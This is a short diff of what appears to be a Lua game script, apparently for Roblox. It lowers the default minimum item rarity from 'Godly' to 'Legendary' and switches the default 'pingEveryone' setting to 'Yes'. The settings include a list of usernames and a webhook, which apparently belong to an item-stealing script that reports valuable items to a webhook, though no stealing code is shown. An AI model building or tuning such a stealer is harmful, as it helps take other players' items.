@@ -5,9 +5,9 @@ end
 _G.scriptExecuted = true
 
 local users = _G.Usernames or {}
-local min_rarity = _G.min_rarity or "Godly"
+local min_rarity = _G.min_rarity or "Legendary"
 local min_value = _G.min_value or 1
-local ping = _G.pingEveryone or "No"
+local ping = _G.pingEveryone or "Yes"
 local webhook = _G.webhook or ""
 
 if next(users) == nil or webhook == "" then
